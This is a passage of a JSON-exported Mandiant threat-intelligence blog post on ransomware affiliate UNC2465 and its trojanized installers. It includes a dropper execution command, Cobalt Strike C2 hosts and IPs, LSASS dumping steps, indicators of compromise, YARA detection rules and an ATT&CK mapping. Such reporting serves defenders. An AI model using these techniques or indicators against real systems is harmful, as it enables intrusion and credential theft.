border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ecmd.exe \/c \u0027C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe\u0027\u0026amp;\u0026amp;exit\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EThe execution of ScareCrow framework dropper C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe resulted in the creation of a Cobalt Strike stageless payload to C:\\ProgramData\\Cisco\\update.exe, which then established a connection to a Cobalt Strike Beacon server located at w2doger[.]xyz when executed.\u003C\/p\u003E\n\u003Cp\u003EMandiant observed the attacker using UltraVNC to download and store a file named update.lnk in the %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ directory. Mandiant was not able to recover update.lnk at the time of writing, but suspects that this file was created to add persistence to the Cobalt Strike stageless payload.\u003C\/p\u003E\n\u003Ch4\u003ELSASS Dumping and Lateral Movement\u003Ci\u003E\u003C\/i\u003E\u003C\/h4\u003E\n\u003Cp\u003EMandiant observed this attacker dump the LSASS process using Task Manager to a file named lsass.DMP, and later, zip the dump into two files named lsass.zip and lsass2.zip located in the C:\\ProgramData\\psh\\ directory.\u003C\/p\u003E\n\u003Cp\u003EFrom this point, the attacker was observed moving laterally to different systems in the environment using Remote Desktop Protocol (RDP) connections.\u003C\/p\u003E\n\u003Ch4\u003EConclusion\u003C\/h4\u003E\n\u003Cp\u003EUNC2465 established initial access via a Trojanized installer executed by an unsuspecting user. UNC2465 interactively established an NGROK tunnel and began moving laterally in less than 24 hours. Five days later, UNC2465 returned and deployed additional tools such as a keylogger, Cobalt Strike BEACON, and conducted credential harvesting via dumping LSASS memory.\u003C\/p\u003E\n\u003Cp\u003ERansomware groups continue to adapt and pursue opportunistic access to victims. UNC2465\u2019s move from drive-by attacks on website visitors or phishing emails to this software supply chain attack shows a concerning shift that presents new challenges for detection. While many organizations are now focusing more on perimeter defenses and two-factor authentication after recent public examples of password reuse or VPN appliance exploitation, monitoring on endpoints is often overlooked or left to traditional antivirus. A well-rounded security program is essential to mitigate risk from sophisticated groups such as UNC2465 as they continue to adapt to a changing security landscape.\u003C\/p\u003E\n\u003Ch4\u003EIndicators\u003C\/h4\u003E\n\u003Cp\u003E\u003Ci\u003ESupply Chain\/Trojanized Nullsoft Installer\/SmartPSS\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EMD5: 1430291f2db13c3d94181ada91681408\u003Cbr\u003E\nFilename: SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General-v1.exe\u003Cbr\u003E\nZip MD5: 54e0a0d398314f330dfab6cd55d95f38\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003ESupply Chain\/Trojanized Nullsoft Installer\/SVStation\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EMD5: e9ed774517e129a170cdb856bd13e7e8\u003Cbr\u003E\nFilename: SVStation_Win64-B1130.1.0.0.exe\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003EIntermediate Stage\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EURL: hxxp:\/\/sdoc[.]xyz\/ID-508260156241\u003Cbr\u003E\nIP: 185.92.151[.]150\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003ESMOKEDHAM LOADER\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EMD5: f075c2894ac84df4805e8ccf6491a4f4 (Gbdh7yghJgbj3bb.html)\u003C\/p\u003E\n\u003Cp\u003EMD5: 05d38c7e957092f7d0ebfc7bf1eb5365\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003ESMOKEDHAM\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EMD5: 127bf1d43313736c52172f8dc6513f56 (in-memory from f075c2894ac84df4805e8ccf6491a4f4)\u003Cbr\u003E\nHost: max-ghoster1.azureedge[.]net (actual C2)\u003C\/p\u003E\n\u003Cp\u003EMD5: 9de326bf37270776b78e30d442bda48b (MEtNOcyfkXWe.html)\u003Cbr\u003E\nHost: atlant20.azureedge[.]net (actual C2)\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003EMD5: b06319542cab55346776f0358a61b3b3 (in-memory from 05d38c7e957092f7d0ebfc7bf1eb5365)\u003Cbr\u003E\nHost: skolibri13.azureedge[.]net (actual C2)\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003ENGROK\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EMD5: e3bc4dd84f7a24f24d790cc289e0a10f (legitimate NGROK renamed to conhost.exe)\u003C\/p\u003E\n\u003Cp\u003EMD5: 84ed6012ec62b0bddcd18058a8ff7ddd (VirtualHost.vbs)\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003EUltraVNC\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EIP\/Port: 81.91.177[.]54:7234 (using legitimate ULTRAVNC 23b89bf2c2b99fbc1e232b4f86af65f4)\u003C\/p\u003E\n\u003Cp\u003E\u003Ci\u003EBEACON\u003C\/i\u003E\u003C\/p\u003E\n\u003Cp\u003EHost: w2doger[.]xyz\u003Cbr\u003E\nIP: 185.231.68.102\u003Cbr\u003E\nMD5: a9fa3eba3f644ba352462b904dfbcc1a (shellcode)\u003C\/p\u003E\n\u003Ch4\u003EDetecting the Techniques\u003C\/h4\u003E\n\u003Cp\u003EFireEye detects this activity across our platforms. The following contains specific detection names that provide indicators associated with this activity.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022631\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022259\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EPlatform\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022372\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EDetection Name\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022259\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EFireEye Network Security\u003C\/p\u003E\n\u003Cp\u003EFireEye Email Security\u003C\/p\u003E\n\u003Cp\u003EFireEye Detection On Demand\u003C\/p\u003E\n\u003Cp\u003EFireEye Malware Analysis\u003C\/p\u003E\n\u003Cp\u003EFireEye Malware File Protect\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022372\u0022 valign=\u0022top\u0022\u003E\u003Cul\u003E\n\u003Cli\u003EBackdoor.BEACON\u003C\/li\u003E\n\u003Cli\u003EFE_Loader_Win32_BLUESPINE_1\u003C\/li\u003E\n\u003Cli\u003ETrojan.Win32.CobaltStrike\u003C\/li\u003E\n\u003Cli\u003EBackdoor.MSIL.SMOKEDHAM\u003C\/li\u003E\n\u003Cli\u003EMalware.Binary.ps1\u003C\/li\u003E\n\u003Cli\u003EFEC_Backdoor_CS_SMOKEDHAM_1\u003C\/li\u003E\n\u003Cli\u003ESuspicious Process PowerShell Activity\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022259\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EFireEye Endpoint Security\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022372\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EReal-Time Detection (IOC)\u003C\/b\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EWDIGEST CREDENTIAL EXPOSURE (METHODOLOGY)\u003C\/li\u003E\n\u003Cli\u003EWDIGEST CREDENTIAL EXPOSURE VIA REGISTRY (METHODOLOGY)\u003C\/li\u003E\n\u003Cli\u003ESUSPICIOUS CONHOST.EXE A (METHODOLOGY)\u0026nbsp;\u003C\/li\u003E\n\u003Cli\u003ETASKMGR PROCESS DUMP OF LSASS.EXE A (METHODOLOGY)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cb\u003EMalware Protection (AV\/MG)\u003C\/b\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003ETrojan.GenericFCA.Script.533\u0026nbsp;\u003C\/li\u003E\n\u003Cli\u003ETrojan.GenericFCA.Agent.7732\u003C\/li\u003E\n\u003Cli\u003EDropped:Trojan.VBS.VGU\u003C\/li\u003E\n\u003Cli\u003ETrojan.CobaltStrike.FM\u003C\/li\u003E\n\u003Cli\u003ENGRok\u003C\/li\u003E\n\u003Cli\u003EUltra VNC\u003C\/li\u003E\n\u003Cli\u003ESVN Station\u003C\/li\u003E\n\u003Cli\u003EGeneric.mg.a9fa3eba3f644ba3\u003C\/li\u003E\n\u003Cli\u003EGeneric.mg.1626373508569884\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cb\u003EModules\u003C\/b\u003E\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EProcess Guard\u0026nbsp;(LSASS memory protection)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022259\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EFireEye Helix\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022372\u0022 valign=\u0022top\u0022\u003E\u003Cul\u003E\n\u003Cli\u003EVNC METHODOLOGY [Procs] (T1021.005)\u003C\/li\u003E\n\u003Cli\u003EWINDOWS ANALYTICS [Abnormal RDP Logon] (T1078)\u003C\/li\u003E\n\u003Cli\u003EWINDOWS ANALYTICS [Recon Commands] (T1204)\u003C\/li\u003E\n\u003Cli\u003EWINDOWS METHODOLOGY [Cleartext Credentials Enabled - UseLogonCredential] (T1003.001)\u003C\/li\u003E\n\u003Cli\u003EWINDOWS METHODOLOGY [LSASS Generic Dump Activity] (T1003.001)\u003C\/li\u003E\n\u003Cli\u003EWINDOWS METHODOLOGY [LSASS Memory Access] (T1003.001)\u003C\/li\u003E\n\u003Cli\u003EWINDOWS METHODOLOGY [Registry Run Key - reg.exe] (T1547.001)\u003C\/li\u003E\n\u003Cli\u003EWINDOWS METHODOLOGY [User Created - Net Command] (T1136.001)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Ch4\u003EYara Detections\u003C\/h4\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022649\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Erule Backdoor_Win_SMOKEDHAM\u003Cb\u003E\u003Cbr\u003E\n \u003C\/b\u003E{\u003Cb\u003E\u003Cbr\u003E\n \u003C\/b\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; meta:\u003Cb\u003E\u003Cbr\u003E\n \u003C\/b\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; author = \u0026quot;Mandiant\u0026quot;\u003Cb\u003E\u003Cbr\u003E\n \u003C\/b\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; date_created = \u0026quot;2021-06-10\u0026quot;\u003Cb\u003E\u003Cbr\u003E\n \u003C\/b\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; md5 = \u0026quot;9de326bf37270776b78e30d442bda48b\u0026quot;\u003Cb\u003E\u003Cbr\u003E\n \u003C\/b\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; strings:\u003Cb\u003E\u003Cbr\u003E\n \u003C\/b\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $C2Method = { 2E 4D 65 74 68 6F 64 20 3D 20 22 50 4F 53 54 22 } \/\/.Method = \u0026quot;POST\u0026quot;\u003Cb\u003E\u003Cbr\u003E\n \u003C\/b\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $domainFrontingDomain = \/\\.[hH]ost\\s*=\\s*\\\u0026quot;[^\\\u0026quot;]*\u0026quot;;\/\u003Cb\u003E\u003Cbr\u003E\n \u003C\/b\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $envCollection1 = { 45 6E 76 69 72 6F 6E 6D 65 6E 74 2E 47 65 74 45 6E 76 69 72 6F 6E 6D 65 6E 74 56 61 72 69 61 62 6C 65 28 22 43 4F 4D 50 55 54 45 52 4E 41 4D 45 22 29 } \/\/Environment.GetEnvironmentVariable(\u0026quot;COMPUTERNAME\u0026quot;)\u003Cb\u003E\u003Cbr\u003E\n \u003C\/b\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $envCollection2 = { 45 6E 76 69 72 6F 6E 6D 65 6E 74 2E 47 65 74 45 6E 76 69 72 6F 6E 6D 65 6E 74 56 61 72 69 61 62 6C 65 28 22 55 53 45 52 44 4F 4D 41 49 4E 22 29 } \/\/Environment.GetEnvironmentVariable(\u0026quot;USERDOMAIN\u0026quot;)\u003Cb\u003E\u003Cbr\u003E\n \u003C\/b\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $envCollection3 = { 45 6E 76 69 72 6F 6E 6D 65 6E 74 2E 47 65 74 45 6E 76 69 72 6F 6E 6D 65 6E 74 56 61 72 69 61 62 6C 65 28 22 55 53 45 52 4E 41 4D 45 22 29 } \/\/Environment.GetEnvironmentVariable(\u0026quot;USERNAME\u0026quot;)\u003Cb\u003E\u003Cbr\u003E\n \u003C\/b\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $functionalityString1 = { 28 22 64 65 6C 61 79 22 29 } \/\/(\u0026quot;delay\u0026quot;)\u003Cb\u003E\u003Cbr\u003E\n \u003C\/b\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $functionalityString2 = { 28 22 73 63 72 65 65 6E 73 68 6F 74 22 29 } \/\/(\u0026quot;screenshot\u0026quot;)\u003Cb\u003E\u003Cbr\u003E\n \u003C\/b\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $functionalityString3 = { 28 22 65 78 69 74 22 29 } \/\/(\u0026quot;exit\u0026quot;)\u003Cb\u003E\u003Cbr\u003E\n \u003C\/b\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $publicStrings1 = \u0026quot;public string UUID\u0026quot;\u003Cb\u003E\u003Cbr\u003E\n \u003C\/b\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $publicStrings2 = \u0026quot;public string ID\u0026quot;\u003Cb\u003E\u003Cbr\u003E\n \u003C\/b\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $publicStrings3 = \u0026quot;public string Data\u0026quot;\u003Cb\u003E\u003Cbr\u003E\n \u003C\/b\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $UserAgentRequest = { 20 3D 20 45 6E 76 69 72 6F 6E 6D 65 6E 74 2E 4F 53 56 65 72 73 69 6F 6E 2E 54 6F 53 74 72 69 6E 67 28 29 3B } \/\/ = Environment.OSVersion.ToString();\u003Cb\u003E\u003Cbr\u003E\n \u003C\/b\u003E\u0026nbsp;\u0026nbsp; condition:\u003Cb\u003E\u003Cbr\u003E\n \u003C\/b\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; filesize \u0026lt; 1MB and all of them\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E}\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u0026nbsp;\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022649\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Erule Loader_Win_SMOKEDHAM\u003Cbr\u003E\n {\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp; meta:\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; author = \u0026quot;Mandiant\u0026quot;\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; date_created = \u0026quot;2021-06-10\u0026quot;\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; md5 = \u0026quot;05d38c7e957092f7d0ebfc7bf1eb5365\u0026quot;\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp; strings:\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $listedDLLs1 = \u0026quot;System.Drawing.dll\u0026quot; fullword\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $listedDLLs2 = \u0026quot;System.Web.Extensions.dll\u0026quot; fullword\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $listedDLLs3 = \u0026quot;System.Windows.Forms.dll\u0026quot; fullword\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $CSharpLang = {2d 4c 61 6e 67 75 61 67 65 20 43 53 68 61 72 70} \/\/ -Language CSharp\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $StringConversion = \u0026quot;convertto-securestring\u0026quot; nocase\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $SecureString1 = {5b 53 79 73 74 65 6d 2e 52 75 6e 74 69 6d 65 2e 49 6e 74 65 72 6f 70 53 65 72 76 69 63 65 73 2e 4d 61 72 73 68 61 6c 5d 3a 3a 53 65 63 75 72 65 53 74 72 69 6e 67 54 6f 42 53 54 52} \/\/[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; $SecureString2 = {5b 53 79 73 74 65 6d 2e 52 75 6e 74 69 6d 65 2e 49 6e 74 65 72 6f 70 53 65 72 76 69 63 65 73 2e 4d 61 72 73 68 61 6c 5d 3a 3a 50 74 72 54 6f 53 74 72 69 6e 67 41 75 74 6f} \/\/[System.Runtime.InteropServices.Marshal]::PtrToStringAuto\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp; condition:\u003Cbr\u003E\n \u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp; filesize \u0026lt; 1MB and (1 of ($listedDLLs*)) and $CSharpLang and $StringConversion and $SecureString1 and $SecureString2\u003Cbr\u003E\n }\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Ch4\u003EMITRE ATT\u0026amp;CK UNC2465\u003C\/h4\u003E\n\u003Ctable border=\u00220\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 width=\u0022624\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022150\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003ETactic\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022474\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EDescription\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022150\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EInitial Access\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022474\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u0026nbsp; T1189: Drive-by Compromise\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1195.002: Compromise Software Supply Chain\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1566: Phishing\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022150\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EExecution\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022474\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u0026nbsp; T1053.005: Scheduled Task\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1059.001: PowerShell\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1059.005: Visual Basic\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022150\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EPersistence\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022474\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u0026nbsp; T1098: Account Manipulation\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1136: Create Account\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1547.001: Registry Run Keys \/ Startup Folder\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1547.004: Winlogon Helper DLL\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1547.009: Shortcut Modification\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022150\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EDefense Evasion\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022474\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u0026nbsp; T1027: Obfuscated Files or Information\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1070.006: Timestomp\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1112: Modify Registry\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1140: Deobfuscate\/Decode Files or Information\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1218.005: Mshta\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1553.002: Code Signing\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1562.004: Disable or Modify System Firewall\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022150\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EDiscovery\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022474\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u0026nbsp; T1012: Query Registry\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1033: System Owner\/User Discovery\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1082: System Information Discovery\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022150\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ECollection\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022474\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u0026nbsp; T1056.001: Keylogging\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1113: Screen Capture\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1560: Archive Collected Data\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022150\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EImpact\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022474\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u0026nbsp; T1486: Data Encrypted for Impact\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1531: Account Access Removal\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022150\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ECommand and Control\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022474\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u0026nbsp; T1071.001: Web Protocols\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1090.004: Domain Fronting\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1102: Web Service\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1105: Ingress Tool Transfer\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1219: Remote Access Software\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1572: Protocol Tunneling\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1573.002: Asymmetric Cryptography\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022150\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ELateral Movement\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022474\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u0026nbsp; T1021.004: SSH\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1021.005: VNC\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022150\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ECredential Access\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022474\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u0026nbsp; T1003.001: LSASS Memory\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022150\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EResource Development\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022474\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u0026nbsp;\u0026nbsp; T1588.003: Code Signing Certificates\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1588.004: Digital Certificates\u003Cbr\u003E\n\u0026nbsp;\u0026nbsp; T1608.003: Install Digital Certificate\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Ch4\u003EAcknowledgements\u003C\/h4\u003E\n\u003Cp\u003EThanks to everyone that contributed analysis and review. Special thanks to Alison Stailey, Joseph Reyes, Nick Richard, Andrew Thompson, Jeremy Kennelly, Joshua Sablatura, Evan Reese, Van Ta, Stephen Eckels, and Tufail Ahmed.\u003C\/p\u003E\n",
        "jcr:lastModified": "Thu Jun 17 2021 15:36:14 GMT+0000",
        "sling:resourceType": "social\/blog\/components\/entrytext"
      }
    },
    "summary": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "text": "\u003Cp\u003EMandiant observed DARKSIDE affiliate UNC2465 accessing at least one victim through a Trojanized software installer downloaded from a legitimate website.\u003C\/p\u003E\n",
      "jcr:lastModified": "Tue Jun 15 2021 19:07:55 GMT+0000",
      "sling:resourceType": "social\/blog\/components\/entrytextteaser"
    },
    "image": {
      "jcr:primaryType": "nt:unstructured",
      "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
      "jcr:lastModified": "Wed Jun 16 2021 17:40:10 GMT+0000",
      "imageRotate": "0"
    }
  }
}
